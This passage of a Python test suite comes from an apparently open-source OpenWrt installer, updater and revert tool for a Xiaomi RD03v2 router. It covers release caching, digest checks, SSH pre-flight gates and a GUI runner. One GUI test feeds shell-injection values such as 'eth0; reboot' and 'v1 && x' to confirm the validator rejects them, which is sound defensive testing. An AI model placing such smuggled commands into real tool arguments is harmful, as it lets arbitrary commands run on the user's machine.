                  and "explicit release tag" in str(exc) and not cache.called)
        messages = []
        rel = release.resolve("v1.13", destdir="cache", log=messages.append)
        check("explicit tag retains verified cache fallback",
              rel is pinned and cache.call_args == mock.call("v1.13", profile, "cache")
              and messages == ["[!] release API unavailable; using verified v1.13 cache"])

    with mock.patch.object(release, "_api", side_effect=online_error), \
            mock.patch.object(release, "from_cache",
                              side_effect=release.ReleaseError("bad cache")):
        try:
            release.resolve("v1.13")
            check("failed fallback preserves the original API error", False)
        except release.ReleaseError as exc:
            check("failed fallback preserves the original API error", exc is online_error)


def test_release_entrypoints():
    import install
    import revert
    print("\n== release selection entrypoints and resume ==")
    profile = devices.RD03V2
    endpoint = f"repos/{profile.release_repo}/releases/"
    meta = {"tag_name": "v1.13", "assets": []}
    root = tempfile.mkdtemp(prefix="xiaomi-release-selection-")
    old_umask = os.umask(0o077)
    try:
        images = {kind: {"name": kind, "path": os.path.join(root, kind),
                         "sha256": "a" * 64}
                  for kind in profile.image_kinds}
        with mock.patch.object(chain, "local_interface", return_value=None), \
                mock.patch.object(chain, "set_log_sink", side_effect=lambda fh: fh.close()), \
                mock.patch.object(chain, "_LOG_SINK", None), \
                mock.patch.object(chain, "init_info",
                                  side_effect=AssertionError("router contacted")), \
                mock.patch.object(release, "get_images", return_value=images), \
                mock.patch.object(install, "expected_volume", return_value=(b"volume", "md5")):
            for options, suffix in (([], "latest"), (["--release", "latest"], "latest"),
                                    (["--release", "v1.13"], "tags/v1.13")):
                with mock.patch.object(release, "_api", return_value=meta) as api, \
                        mock.patch("builtins.print"):
                    rc = install.main(["--dry-run", "--outdir", root] + options)
                check(f"installer {options!r} selects the expected release",
                      rc == 0 and api.call_count == 1
                      and api.call_args == mock.call(endpoint + suffix))

            args = install.parse_args(["--transport", "wired"])
            args.images = root
            args.discover = "eth0"
            manifest = os.path.join(root, "resume.json")
            install.write_resume_manifest(
                manifest, args, profile, release.Release(meta), images, "token", None)

            def updated_api(path):
                return {**meta, "tag_name": "v1.14"} if path.endswith("/latest") else meta

            with mock.patch.object(release, "_api", side_effect=updated_api) as api, \
                    mock.patch("builtins.print"):
                rc = install.main(["--resume-manifest", manifest, "--dry-run"])
            check("resuming after a new release retains the recorded tag",
                  rc == 0 and api.call_count == 1
                  and api.call_args == mock.call(endpoint + "tags/v1.13"))

            with mock.patch.object(release, "_api") as api, \
                    mock.patch.object(release, "from_cache",
                                      return_value=release.Release(meta)) as cache, \
                    mock.patch("builtins.print"):
                rc = install.main(["--resume-manifest", manifest, "--dry-run", "--offline"])
            check("offline resume uses the recorded concrete tag without GitHub",
                  rc == 0 and not api.called
                  and cache.call_args == mock.call("v1.13", profile, root))

            args.offline = True
            install.write_resume_manifest(
                manifest, args, profile, release.Release(meta), images, "token", None)
            with mock.patch.object(release, "_api") as api, \
                    mock.patch.object(release, "from_cache",
                                      return_value=release.Release(meta)) as cache, \
                    mock.patch("builtins.print"):
                rc = install.main(["--resume-manifest", manifest, "--dry-run"])
            check("an offline install stays offline when resumed without --offline",
                  rc == 0 and not api.called
                  and cache.call_args == mock.call("v1.13", profile, root))

            with mock.patch.object(release, "_api") as api, \
                    mock.patch("builtins.print"):
                try:
                    install.main(["--dry-run", "--offline", "--outdir", root])
                    check("installer rejects offline latest before router access", False)
                except release.ReleaseError as exc:
                    check("installer rejects offline latest before router access",
                          "explicit release tag" in str(exc) and not api.called)

        for options, suffix in (([], "latest"), (["--release", "latest"], "latest"),
                                (["--release", "v1.13"], "tags/v1.13")):
            argv = ["revert.py", "--device", "rd03v2", "stock.bin",
                    "--transport", "wired", "--dry-run"] + options
            with mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(release, "_api", return_value=meta) as api, \
                    mock.patch.object(revert, "verified_ram_images",
                                      side_effect=RuntimeError("stop before router")):
                try:
                    revert.main()
                except RuntimeError as exc:
                    if str(exc) != "stop before router":
                        raise
            check(f"revert {options!r} selects the expected release",
                  api.call_count == 1 and api.call_args == mock.call(endpoint + suffix))

        argv = ["revert.py", "--device", "rd03v2", "stock.bin",
                "--transport", "wired", "--offline"]
        with mock.patch.object(sys, "argv", argv), \
                mock.patch.object(release, "_api") as api, \
                mock.patch.object(revert, "verified_ram_images") as images_loader:
            try:
                revert.main()
                check("revert rejects offline latest before loading RAM images", False)
            except release.ReleaseError as exc:
                check("revert rejects offline latest before loading RAM images",
                      "explicit release tag" in str(exc)
                      and not api.called and not images_loader.called)

        for options, suffix in (([], "latest"), (["--tag", "latest"], "latest"),
                                (["--tag", "v1.13"], "tags/v1.13")):
            with mock.patch.object(release, "_api", return_value=meta) as api, \
                    mock.patch("builtins.print"):
                rc = release.main(["release.py", "--device", "rd03v2"] + options)
            check(f"release CLI {options!r} selects the expected release",
                  rc == 0 and api.call_count == 1
                  and api.call_args == mock.call(endpoint + suffix))

        with mock.patch.object(release, "_api") as api:
            try:
                release.main(["release.py", "--device", "rd03v2", "--offline"])
                check("release CLI rejects offline latest without GitHub", False)
            except release.ReleaseError as exc:
                check("release CLI rejects offline latest without GitHub",
                      "explicit release tag" in str(exc) and not api.called)
    finally:
        os.umask(old_umask)
        shutil.rmtree(root, ignore_errors=True)


def test_release_integrity():
    print("\n== release cache and integrity ==")
    one = release.Release({"tag_name": "v1.10", "assets": []})
    two = release.Release({"tag_name": "v1.11", "assets": []})
    check("release cache is tag-scoped",
          release.cache_dir(one, "images") != release.cache_dir(two, "images"))

    digest = "a" * 64
    rel = release.Release({
        "tag_name": "v1.11",
        "assets": [{"name": "image.bin", "browser_download_url": "http://x/",
                    "size": 1, "digest": f"sha256:{digest}"}],
    })
    check("matching manifest and GitHub digests are accepted",
          release.expected_digest(rel, "image.bin", digest) == digest)
    try:
        release.expected_digest(rel, "image.bin", "b" * 64)
        check("conflicting release digests fail closed", False)
    except release.ReleaseError as exc:
        check("conflicting release digests fail closed",
              "internally inconsistent" in str(exc))

    root = tempfile.mkdtemp(prefix="xiaomi-offline-release-")
    try:
        tagged = os.path.join(root, "v1.11")
        os.makedirs(tagged)
        payload = os.path.join(tagged, "image.bin")
        with open(payload, "wb") as output:
            output.write(b"verified cache")
        digest = release.sha256(payload)
        with open(os.path.join(tagged, "sha256sums.txt"), "w") as output:
            output.write(f"{digest}  image.bin\n")
        cached = release.resolve("v1.11", devices.RD03V2, root, offline=True)
        check("verified offline cache reconstructs release metadata",
              release.api_digest(cached, "image.bin") == digest)
    finally:
        shutil.rmtree(root, ignore_errors=True)

    unsigned_name = devices.RD03V2.release_prefix + "-squashfs-sysupgrade.bin"
    unsigned = release.Release({
        "tag_name": "dev",
        "assets": [{"name": unsigned_name,
                    "browser_download_url": "http://invalid/",
                    "size": 1}],
    })
    unsigned_root = tempfile.mkdtemp(prefix="unsigned-release-")
    try:
        try:
            release.get_images(unsigned, unsigned_root, kinds=("sysupgrade",))
            check("length-only release asset is refused", False)
        except release.ReleaseError as exc:
            check("length-only release asset is refused",
                  "no trusted SHA-256" in str(exc))
    finally:
        shutil.rmtree(unsigned_root, ignore_errors=True)


def test_tagged_revert_cache():
    import revert
    print("\n== tagged revert cache ==")
    root = tempfile.mkdtemp(prefix="xiaomi-revert-cache-")
    try:
        tagged = os.path.join(root, "v1.11")
        os.makedirs(tagged)
        prefix = devices.RD03V2.release_prefix
        ubi = os.path.join(tagged, prefix + "-initramfs-factory-wifi.ubi")
        itb = os.path.join(tagged, prefix + "-initramfs-uImage-wifi.itb")
        open(ubi, "wb").write(b"ubi")
        open(itb, "wb").write(b"itb")
        with open(os.path.join(tagged, "sha256sums.txt"), "w") as output:
            output.write(f"{release.sha256(ubi)}  {os.path.basename(ubi)}\n")
            output.write(f"{release.sha256(itb)}  {os.path.basename(itb)}\n")
        rel = release.from_cache("v1.11", devices.RD03V2, root)
        got_ubi, got_itb = revert.verified_ram_images(
            rel, root, wifi=True)
        check("revert uses the exact verified release image pair",
              got_ubi == ubi and got_itb == itb)
    finally:
        shutil.rmtree(root, ignore_errors=True)


def test_stock_image():
    """Carve and validate the real Xiaomi image, if it is present."""
    image = os.environ.get("XIAOMI_STOCK_IMAGE")
    if not image:
        skip("stock image carve", "set XIAOMI_STOCK_IMAGE to enable")
        return
    if not os.path.isfile(image):
        check("stock image path exists", False, image)
        return
    import restore
    print("\n== stock image carve ==")
    profile = devices.RD03V2
    payload, digest, known = restore.carve(image, profile)
    check("hash is a published one", bool(known), str(known))
    check("payload is a whole number of PEBs",
          len(payload) % profile.peb_size == 0)
    img = restore.inspect(payload, profile)
    names = {v.name for v in img.volumes.values() if v.lebs}
    check("carries kernel + ubi_rootfs", names == {"kernel", "ubi_rootfs"}, str(names))
    check("single UBI", len(img.image_seqs) == 1)
    check("fits stock slot 0", len(payload) <= profile.stock_slot0[1])

    # the erase plan must cover exactly what is above stock's slot 0
    mtd = {
        "ubi_kernel": {"index": 18,
                       "size": profile.openwrt_partitions["ubi_kernel"][1]},
        "rootfs": {"index": 19,
                   "size": profile.openwrt_partitions["rootfs"][1]},
    }
    pl = restore.plan(mtd, profile)
    _k, tail_off, tail_cnt = pl["erase_tail"]
    abs_start = profile.openwrt_partitions["ubi_kernel"][0] + tail_off
    check("tail erase starts exactly at stock slot 1",
          abs_start == profile.stock_slot0[0] + profile.stock_slot0[1],
          hex(abs_start))
    check("tail erase runs to the end of ubi_kernel",
          tail_off + tail_cnt * profile.peb_size
          == profile.openwrt_partitions["ubi_kernel"][1])
    check("rootfs erase covers the whole partition",
          pl["erase_rootfs"][2] * profile.peb_size
          == profile.openwrt_partitions["rootfs"][1])

    bad = b"XXXX" + payload[4:]
    try:
        restore.carve.__wrapped__ if False else None
        import tempfile, os as _os
        with tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False) as fh:
            fh.write(bad); bp = fh.name
        try:
            restore.carve(bp, profile); check("non-HDR1 refused", False)
        except restore.RestoreError as e:
            check("non-HDR1 refused", "HDR1" in str(e))
        finally:
            _os.unlink(bp)
    except Exception as e:
        check("non-HDR1 refused", False, str(e))


def test_expected_volume():
    d = os.environ.get("RD03V2_IMAGES")
    if not d or not os.path.isdir(d):
        return
    import glob
    import install
    print("\n== installer read-back expectation ==")
    ubi = glob.glob(os.path.join(d, "*initramfs-factory.ubi"))
    itb = glob.glob(os.path.join(d, "*initramfs-uImage.itb"))
    if not (ubi and itb):
        return
    blob, md5 = install.expected_volume(ubi[0], itb[0])
    parsed = ubiparse.UbiImage(open(ubi[0], "rb").read())
    itb_size = os.path.getsize(itb[0])
    check("expected volume derived from the real pair",
          len(blob) % parsed.leb_size() == 0
          and 0 <= len(blob) - itb_size < parsed.leb_size(),
          f"volume={len(blob)} image={itb_size} leb={parsed.leb_size()}")
    check("it is the .itb plus 0xff padding",
          blob.startswith(open(itb[0], "rb").read())
          and set(blob[os.path.getsize(itb[0]):]) == {0xFF})
    check("md5 is of the padded volume, not the .itb",
          md5 == hashlib.md5(blob).hexdigest()
          and md5 != hashlib.md5(open(itb[0], "rb").read()).hexdigest())


# ---- updater.py -------------------------------------------------------------


class _UpdateBox:
    """An installed RD03v2 as updater.py sees it over SSH.

    After the pivot the old system keeps answering for `lingers` more calls,
    which is what a real `reboot` does, before landing in `lands_in`.
    """
    MTD = ('dev:    size   erasesize  name\n'
           'mtd18: 02400000 00020000 "ubi_kernel"\n'
           'mtd19: 05180000 00020000 "rootfs"\n')

    def __init__(self, password="", rootfs="overlay", board=None, board_rc=0,
                 mtd=MTD, attached="19", lingers=0, lands_in="tmpfs",
                 memory=90000, ssid="Home", bad_copy=False):
        self.password, self.rootfs = password, rootfs
        self.board = devices.RD03V2.openwrt_board if board is None else board
        self.board_rc, self.mtd, self.attached = board_rc, mtd, attached
        self.lingers, self.lands_in, self.pivoted = lingers, lands_in, False
        self.memory, self.ssid, self.bad_copy = memory, ssid, bad_copy
        self.commands, self.offered, self.backup = [], [], None

    def pivot(self):
        self.pivoted = True

    def ssh(self, host, cmd, timeout=120, check=True, passwords=None):
        offered = list(install.SSH_PASSWORDS if passwords is None else passwords)
        self.offered.append(offered)
        if self.pivoted:
            if self.lingers:
                self.lingers -= 1
            else:
                self.rootfs = self.lands_in
                if self.rootfs == "tmpfs":
                    self.password = ""
        if self.password not in offered:
            rc, out = 255, "root@box: Permission denied (publickey,password)."
        else:
            self.commands.append(cmd)
            rc, out = self.answer(cmd)
        if check and rc:
            raise install.Abort(f"ssh {cmd!r} failed: {out}")
        return rc, out

    def answer(self, cmd):
        if "board_name" in cmd:
            return (self.board_rc, self.board if self.board_rc == 0 else "")
        if "rootfs_type" in cmd:
            return 0, self.rootfs
        if "/proc/mtd" in cmd:
            return 0, self.mtd
        if "mtd_num" in cmd:
            return 0, self.attached
        if "MemAvailable" in cmd:
            return 0, f"MemAvailable:   {self.memory} kB"
        if "flash_type" in cmd:
            return 0, "11"
        if "uci -q get wireless" in cmd:
            return (0, self.ssid) if self.ssid else (1, "")
        if "sha256sum" in cmd:
            return 0, "0" * 64 if self.bad_copy else release.sha256(self.backup)
        return 0, "up" if "echo up" in cmd else ""


def _run_update(box, argv, *, transports=None, route="eth0", routes=(), nand=(True, "ok"),
                backup=None, deadline=None, pivot_error=None, pivot_stage=None):
    """updater.main() against `box`; returns what it did and how it ended."""
    import contextlib
    import types
    import updater
    outcome = types.SimpleNamespace(flash=None, pivots=0, error=None, wifi=[],
                                    rootfs_at_flash=None, output="", manifest=None)
    with tempfile.TemporaryDirectory() as tmp:
        images = {}
        for kind in ("initramfs_ubi", "initramfs_itb", "sysupgrade"):
            path = os.path.join(tmp, kind)
            with open(path, "wb") as fh:
                fh.write(kind.encode())
            images[kind] = {"name": kind, "path": path, "sha256": "x", "verified": True}
        def archive(path, members):
            with tarfile.open(path, "w:gz") as tf:
                for name, body in members.items():
                    info = tarfile.TarInfo(name)
                    info.size = len(body)
                    tf.addfile(info, io.BytesIO(body))
            return path
        good = archive(os.path.join(tmp, "good.tar.gz"),
                       {"etc/config/system": b"config system\n"})
        key_only = archive(os.path.join(tmp, "key-only.tar.gz"), {
            "etc/config/system": b"config system\n",
            "etc/config/dropbear": b"config dropbear\n\toption PasswordAuth 'off'\n"})

        def fake_scp_from(host, remote, local):
            if backup == "garbage":
                with open(local, "wb") as fh:
                    fh.write(b"not a tar")
            else:
                shutil.copy(good, local)
            box.backup = local

        def fake_pivot(host, ubi, itb, iface, dry_run=False, fallback=None,
                       recover_stale_lock=False):
            outcome.pivots += 1
            if pivot_error:
                # The real pivot tags how far the write got, and updater picks
                # its advice from that, so the stand-in has to tag it too.
                pivot_error.pivot_stage = pivot_stage or "write-unconfirmed"
                raise pivot_error
            box.pivot()
            return "fe80::1%eth0"

        def fake_flash(*args, **kwargs):
            outcome.flash = {"host": args[0], "cfg": args[6], "manifest": args[7],
                             "transport": args[8], "verify": args[9], "ssid": args[10],
                             "router_iface": kwargs.get("router_iface")}
            outcome.rootfs_at_flash = box.rootfs
            with open(args[7]) as fh:
                outcome.manifest = json.load(fh)

        def fake_get_images(rel, destdir, flavour, kinds, wifi=False):
            outcome.wifi.append(wifi)
            return images

        saved_passwords = install.SSH_PASSWORDS[:], restore.SSH_PASSWORDS[:]
        umask = os.umask(0o022)
        stdout = io.StringIO()
        rel = types.SimpleNamespace(tag="v2.1.1", published="today",
                                    assets=["x-wifi.ubi"], profile=devices.RD03V2)
        transports = transports or {}
        patches = [
            mock.patch.object(install, "ssh", box.ssh),
            mock.patch.object(restore, "ssh",
                              lambda h, c, timeout=180, check=True: box.ssh(h, c, timeout, check)),
            mock.patch.object(install, "ssh_banner", return_value=("SSH-2.0-dropbear", None)),
            mock.patch.object(install, "default_routes", return_value=list(routes)),
            mock.patch.object(install.chain, "local_interface", return_value=route),
            mock.patch.object(install, "detect_transport",
                              lambda i, **k: transports.get(i, "wired")),
            mock.patch.object(install, "wait_and_discover", return_value="fe80::1%eth0"),
            mock.patch.object(release, "resolve", return_value=rel),
            mock.patch.object(release, "get_images", fake_get_images),
            mock.patch.object(release, "check_nand", return_value=nand),
            mock.patch.object(install, "expected_volume", return_value=(b"x", "md5")),
            mock.patch.object(updater.revert, "pivot_to_ram", fake_pivot),
            mock.patch.object(install, "flash", fake_flash),
            mock.patch.object(updater, "scp_from", fake_scp_from),
            mock.patch.object(updater.time, "sleep"),
        ]
        if deadline is not None:
            patches.append(mock.patch.object(updater, "RAM_DEADLINE_S", deadline))
        for patch in patches:
            patch.start()
        try:
            with contextlib.redirect_stdout(stdout):
                arguments = list(argv) + ["--outdir", os.path.join(tmp, "out"), "--yes"]
                named = {"GOOD_BACKUP": good, "KEY_ONLY_BACKUP": key_only}
                arguments = [named.get(item, item) for item in arguments]
                updater.main(arguments)
        except (install.Abort, restore.RestoreError) as exc:
            outcome.error = str(exc)
        finally:
            for patch in reversed(patches):
                patch.stop()
            chain.set_log_sink(None)
            install.SSH_PASSWORDS[:], restore.SSH_PASSWORDS[:] = saved_passwords
            os.umask(umask)
        outcome.output = stdout.getvalue()
        outcome.good_backup = good
    return outcome


def test_install_failure_hint():
    print("\n[install: a failure says how to continue]")
    import channel as ch
    check("a lost shell is a plain failure, not a traceback",
          ch.ChannelError in install.CLEAN_ERRORS)
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "resume.json")
        def hint_at(phase):
            install._write_resume_data(path, {"version": 1, "phase": phase})
            return install.continuation_hint(path) or ""
        check("after pre-flight the same manifest resumes",
              "--resume-manifest" in hint_at("preflight-complete")
              and "--stage" not in hint_at("preflight-complete"))
        check("after the pivot it goes straight to the flash stage",
              "--stage flash --resume-manifest" in hint_at("pivot-complete"))
        check("before pre-flight nothing general can be promised",
              hint_at("prepared") == "")
        check("after sysupgrade starts, flash() has said what to do",
              hint_at("flash-started") == "")
    check("no manifest, no hint", install.continuation_hint("/nonexistent/resume.json") is None)


def _wrote_nothing(box, outcome):
    return outcome.pivots == 0 and outcome.flash is None and not any(
        "sysupgrade -b" in cmd for cmd in box.commands)


def test_updater():
    print("\n[updater: nothing is written unless every gate passes]")
    wired = ["--interface", "eth0"]

    box = _UpdateBox()
    r = _run_update(box, wired, nand=(False, "this release cannot drive this flash"))
    check("the NAND gate runs before any write", _wrote_nothing(box, r)
          and "cannot drive" in (r.error or ""), r.error or "")

    box = _UpdateBox(board="some,other-router")
    r = _run_update(box, wired)
    check("another board is refused", _wrote_nothing(box, r) and "board_name" in (r.error or ""))

    box = _UpdateBox(board_rc=1)
    r = _run_update(box, wired)
    check("a failing board_name fails closed", _wrote_nothing(box, r) and r.error is not None)

    box = _UpdateBox(mtd='mtd3: 02400000 00020000 "kernel"\n')
    r = _run_update(box, wired)
    check("an MTD merely named 'kernel' is not ubi_kernel",
          _wrote_nothing(box, r) and "partition map" in (r.error or ""))

    box = _UpdateBox(attached="18")
    r = _run_update(box, wired)
    check("a ubi_kernel with a UBI attached is refused",
          _wrote_nothing(box, r) and "attached" in (r.error or ""))

    box = _UpdateBox(attached="")
    r = _run_update(box, wired)
    check("unreadable UBI attachments fail closed",
          _wrote_nothing(box, r) and "mtd_num" in (r.error or ""))

    box = _UpdateBox(memory=1000)
    r = _run_update(box, wired)
    check("too little memory for the upload is refused",
          _wrote_nothing(box, r) and "memory" in (r.error or ""))

    box = _UpdateBox(password="set-by-owner")
    r = _run_update(box, wired)
    check("a refused password stops at pre-flight and says what to do",
          _wrote_nothing(box, r) and "--root-password" in (r.error or "")
          and "keys only" in r.error)

    box = _UpdateBox()
    r = _run_update(box, ["--host", "192.168.1.1", "--root-password", "secret"] + wired,
                    routes=[("192.168.1.1", "eth0")])
    check("this host's own gateway never gets offered the password",
          _wrote_nothing(box, r) and not box.offered and "gateway" in (r.error or ""),
          r.error or "")

    box = _UpdateBox()
    r = _run_update(box, wired, backup="garbage")
    check("an unreadable config backup stops before the pivot",
          r.pivots == 0 and r.flash is None and "config backup" in (r.error or ""))

    box = _UpdateBox(bad_copy=True)
    r = _run_update(box, wired)
    check("a config backup damaged in the copy stops before the pivot",
          r.pivots == 0 and "did not survive" in (r.error or ""))

    box = _UpdateBox()
    r = _run_update(box, ["--dry-run"] + wired)
    check("a dry run never contacts the router",
          r.error is None and not box.offered and r.pivots == 0)

    print("\n[updater: the reboot is not mistaken for the RAM installer]")
    box = _UpdateBox(password="secret", lingers=4)
    r = _run_update(box, wired + ["--root-password", "secret"])
    check("a password-protected old system refusing the RAM password is only 'not yet'",
          r.error is None and r.flash is not None, r.error or "")
    check("the flash runs only once tmpfs answers", r.rootfs_at_flash == "tmpfs")
    check("the kept config reaches sysupgrade",
          r.flash and (r.flash["cfg"] or "").endswith("config-backup.tar.gz"))
    check("the RAM polls offered nothing but the empty password",
          [""] in box.offered and box.offered[-1] == [""])
    check("the manifest allows install.py --verify-only to continue",
          r.manifest and r.manifest["phase"] == "pivot-complete"
          and r.manifest["root_password_set"] is True)
    check("a wired flash may accept the router as its cable's gateway",
          r.flash and r.flash["router_iface"] == "eth0")

    box = _UpdateBox(lingers=4)
    r = _run_update(box, wired)
    check("an old system with no password does not pass for the RAM installer",
          r.error is None and r.rootfs_at_flash == "tmpfs", r.error or "")

    box = _UpdateBox(lands_in="overlay")
    r = _run_update(box, wired, deadline=0.05)
    check("a box that came back on NAND is never flashed",
          r.flash is None and "not seen" in (r.error or ""))
    check("that failure says how to continue", "--config-backup" in (r.error or ""))

    box = _UpdateBox()
    r = _run_update(box, wired, pivot_error=install.Abort("nothing appeared on eth0"),
                    pivot_stage="rebooted")
    check("losing the box after the pivot says how to continue",
          "nothing appeared" in (r.error or "") and "--config-backup" in r.error
          and "replaced" in r.error)

    box = _UpdateBox()
    r = _run_update(box, wired, pivot_error=restore.RestoreError(
        "pivot write did not finish ('fail:1'):\nubiformat: error!"),
        pivot_stage="write-unconfirmed")
    check("a failed pivot write is not dropped as a bare error",
          "ubiformat" in (r.error or "") and "--config-backup" in (r.error or ""),
          r.error or "")
    check("a failed pivot write warns against rebooting",
          "do NOT reboot" in (r.error or ""), r.error or "")

    box = _UpdateBox()
    r = _run_update(box, wired, pivot_error=subprocess.TimeoutExpired("ssh", 30),
                    pivot_stage="write-unconfirmed")
    check("a transport timeout mid-write still gets the retry advice",
          "--config-backup" in (r.error or "") and "do NOT reboot" in (r.error or ""),
          r.error or "")

    box = _UpdateBox()
    r = _run_update(box, wired, pivot_error=restore.RestoreError(
        "img.ubi is 4096 B, ubi_kernel holds 1024 B -- refusing to erase the "
        "installed kernel for an image that cannot fit it"),
        pivot_stage="not-written")
    check("a refusal before the write makes no claim about the kernel",
          "cannot fit" in (r.error or "")
          and "do NOT reboot" not in (r.error or "")
          and "replaced" not in (r.error or ""), r.error or "")
    import updater as _updater
    hint = _updater.retry_hint("/tmp/my runs/config-backup.tar.gz")
    check("the retry hint quotes a path the shell would split",
          "'/tmp/my runs/config-backup.tar.gz'" in hint, hint)

    print("\n[updater: continuing from the RAM installer]")
    box = _UpdateBox(rootfs="tmpfs")
    r = _run_update(box, wired)
    check("the RAM system's defaults are never taken for the owner's config",
          r.flash is None and r.pivots == 0 and "--config-backup" in (r.error or "")
          and not any("sysupgrade -b" in c for c in box.commands))

    box = _UpdateBox(rootfs="tmpfs")
    r = _run_update(box, wired + ["--config-backup", "GOOD_BACKUP"])
    check("a saved backup continues without a second pivot",
          r.error is None and r.pivots == 0 and r.flash
          and r.flash["cfg"] == r.good_backup, r.error or "")

    box = _UpdateBox(rootfs="tmpfs")
    r = _run_update(box, wired + ["--no-keep-settings"])
    check("a clean install continues without a backup",
          r.error is None and r.pivots == 0 and r.flash and r.flash["cfg"] is None,
          r.error or "")

    print("\n[updater: the RAM installer matches the link]")
    box = _UpdateBox()
    r = _run_update(box, [], route="wlan0", transports={"wlan0": "wifi"})
    check("a Wi-Fi laptop gets the installer with radios, unasked",
          r.wifi == [True] and r.flash and r.flash["transport"] == "wifi", r.error or "")
    check("the SSID to rejoin is learned before the write",
          r.flash and r.flash["ssid"] == "Home")
    check("no cable means no gateway exception",
          r.flash and r.flash["router_iface"] is None)

    box = _UpdateBox()
    r = _run_update(box, [], route=None)
    check("no route and no --interface stops before contacting anything",
          r.pivots == 0 and not box.offered and "--interface" in (r.error or ""))

    box = _UpdateBox()
    r = _run_update(box, ["--no-keep-settings"], route="wlan0",
                    transports={"wlan0": "wifi"})
    check("a clean install cannot be verified over the Wi-Fi it turns off",
          _wrote_nothing(box, r) and "clean install" in (r.error or ""))

    print("\n[updater: restoring a key-only config]")
    box = _UpdateBox(rootfs="tmpfs")
    r = _run_update(box, wired + ["--config-backup", "KEY_ONLY_BACKUP"])
    check("a backup that disables password login warns before the write",
          r.flash is not None and "turns off password login" in r.output, r.error or "")
    box = _UpdateBox(rootfs="tmpfs")
    r = _run_update(box, wired + ["--config-backup", "GOOD_BACKUP"])
    check("an ordinary backup does not",
          r.flash is not None and "turns off password login" not in r.output)

    box = _UpdateBox(ssid="")
    r = _run_update(box, [], route="wlan0", transports={"wlan0": "wifi"})
    check("an unknown SSID stops before the kernel is overwritten",
          _wrote_nothing(box, r) and "--wifi-ssid" in (r.error or ""))

    box = _UpdateBox()
    r = _run_update(box, ["--verify-interface", "eth1"], route="wlan0",
                    transports={"wlan0": "wifi", "eth1": "wired"})
    check("Wi-Fi out, cable back: a clean-config check on the cable is allowed",
          r.flash and r.flash["verify"] == "eth1" and r.flash["ssid"] is None,
          r.error or "")


# ---- gui/ -------------------------------------------------------------------


def _gui_modules():
    gui = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gui")
    if gui not in sys.path:
        sys.path.insert(0, gui)
    import app as gui_app
    import prereqs as gui_prereqs
    import runner as gui_runner
    return gui, gui_app, gui_prereqs, gui_runner


def test_gui_runner():
    print("\n[gui: runner]")
    _gui, _app, _prereqs, runner = _gui_modules()

    argv = runner.build_argv("update", {"release": "latest", "wifi_ssid": "Home",
                                        "root_password": "pw", "dry_run": False})
    check("an update carries the current password and no Wi-Fi settings",
          "--root-password" in argv and not any("wifi" in a for a in argv))
    check("the tools run under this interpreter", argv[0] == sys.executable)
    check("a real run answers the confirmations up front", "--yes" in argv)
    check("a dry run does not",
          "--yes" not in runner.build_argv("install", {"dry_run": True}))

    for mode, opts, why in (
            ("revert", {"interface": "eth0"}, "image"),
            ("revert", {"stock_image": __file__}, "interface"),
            ("install", {"interface": "eth0; reboot"}, "interface"),
            ("install", {"release": "v1 && x"}, "tag"),
            ("nonsense", {}, "mode")):
        try:
            runner.build_argv(mode, opts)
            check(f"{mode} {sorted(opts)} is refused", False)
        except ValueError as exc:
            check(f"{mode} {sorted(opts)} is refused", why in str(exc), str(exc))

    run = runner.Run("install", {"root_password": "hunter2", "wifi_key": "hunter3",
                                 "wifi_ssid": "Home", "wifi_country": "RU"})
    check("secrets never leave in the shown command",
          "hunter" not in run.shown_argv and "Home" in run.shown_argv, run.shown_argv)
    check("...but the tool itself still gets them", "hunter2" in run.argv)

    print("\n[gui: stages follow the tools' real banners]")
    banners = {
        "=== stage 1: pre-flight (nothing is written) ===": "preflight",
        "=== backup ===": "backup",
        "=== stage 2: pivot (writes the idle slot and the boot flags) ===": "pivot",
        "=== stage 2: pivot into the RAM installer ===": "pivot",
        "=== stage 3: flash (sysupgrade from the RAM system) ===": "flash",
        "=== step 1: pivot into the RAM initramfs ===": "pivot",
        "=== step 2: restore stock ===": "flash",
        "=== step 3: wait for stock ===": "verify",
    }
    root = os.path.dirname(os.path.abspath(__file__))
    source = "".join(open(os.path.join(root, name)).read()
                     for name in ("install.py", "revert.py", "updater.py"))
    for banner, stage in banners.items():
        run = runner.Run("install", {})
        run._interpret(banner)
        check(f"{stage}: {banner[4:-4]}",
              run.stage == stage and banner in source.replace('\\n', ''))

    # Asked directly: under a test runner with no terminal, isatty() is false
    # whether or not stdin was handled.
    run = runner.Run("install", {})
    with mock.patch.object(runner.subprocess, "Popen") as popen, \
            mock.patch.object(runner.threading, "Thread"):
        run.start()
    kwargs = popen.call_args.kwargs
    check("a tool can never wait on a prompt: its stdin is /dev/null",
          kwargs.get("stdin") == subprocess.DEVNULL)
    check("the tools run in English, whatever this system's language",
          kwargs["env"].get("XIAOMI_INSTALL_LANG") == "en")

    run = runner.Run("install", {})
    run._interpret("=== stage 1: pre-flight (nothing is written) ===")
    check("cancel stays possible before anything is written", run.cancellable)
    run._interpret("=== stage 2: pivot into the RAM installer ===")
    check("cancel is refused from the pivot on", not run.cancellable
          and run.cancel() == (False, "unsafe"))

    run = runner.Run("install", {})
    run._interpret("[2] Wi-Fi-only: when the stock network disappears, join 'A' with key 'b'")
    check("the Wi-Fi join banner is recognised",
          any(e["type"] == "wifi" and e["ssid"] == "A" and e["key"] == "b" for e in run.events))
    run = runner.Run("install", {})
    run._interpret("[*] output -> /home/me/my runs/install-1/")
    check("an output path with spaces survives",
          any(e.get("path") == "/home/me/my runs/install-1/" for e in run.events))


def test_gui_strings():
    print("\n[gui: every string exists in every language]")
    gui, _app, prereqs, runner = _gui_modules()
    with open(os.path.join(gui, "static", "strings.json"), encoding="utf-8") as fh:
        strings = json.load(fh)
    with open(os.path.join(gui, "static", "app.js"), encoding="utf-8") as fh:
        script = fh.read()
    with open(os.path.join(gui, "static", "index.html"), encoding="utf-8") as fh:
        page = fh.read()

    import re
    placeholders = lambda text: set(re.findall(r"\{(\w+)\}", text))

    check("the wizard ships every language the command line accepts",
          set(strings) == set(i18n.LANGUAGES) - {"auto"},
          f"{sorted(strings)} vs {sorted(i18n.LANGUAGES)}")
    switch = re.search(r"const LANGS = \[([^\]]+)\]", script)
    check("the language switch offers exactly the catalogues",
          switch is not None and set(re.findall(r'"([^"]+)"', switch.group(1))) == set(strings),
          switch.group(1) if switch else "LANGS not found")

    for language in strings:
        check(f"{language} defines the same keys as English",
              set(strings[language]) == set(strings["en"]),
              str(set(strings["en"]) ^ set(strings[language])))
